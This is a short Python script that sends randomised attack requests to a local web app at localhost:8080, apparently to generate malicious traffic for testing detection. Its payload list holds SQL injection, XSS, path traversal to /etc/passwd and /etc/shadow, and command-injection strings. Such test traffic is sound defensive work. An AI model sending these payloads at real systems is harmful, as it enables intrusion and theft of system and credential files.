import requests
import time
import random

BASE_URL = "http://localhost:8080"

ATTACKS = [
    # SQL Injection
    "/rest/products/search?q=' OR 1=1 --",
    "/rest/products/search?q=' UNION SELECT * FROM users --",
    "/api/Users?email=' OR '1'='1",
    
    # XSS
    "/rest/products/search?q=<script>alert(1)</script>",
    "/contact?comment=<img src=x onerror=alert(1)>",
    
    # Path Traversal
    "/ftp/../../../../etc/passwd",
    "/assets/public/images/../../../../../etc/shadow",
    
    # Command Injection
    "/api/feedbacks?comment=; cat /etc/passwd",
    "/api/feedbacks?comment=| ls -la"
]

def generate_malicious():
    print(f"Starting Malicious Traffic Generation against {BASE_URL}...")
    session = requests.Session()
    
    for _ in range(50):
        path = random.choice(ATTACKS)
        try:
            # URL encode handled by requests partially, but let's send raw sometimes
            url = f"{BASE_URL}{path}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Evil Scanner)"
            }
            res = session.get(url, headers=headers)
            print(f"ATTACK {path} - {res.status_code}")
            time.sleep(random.uniform(0.1, 0.5))
        except Exception as e:
            print(f"Error accessing {path}: {e}")

if __name__ == "__main__":
    generate_malicious()
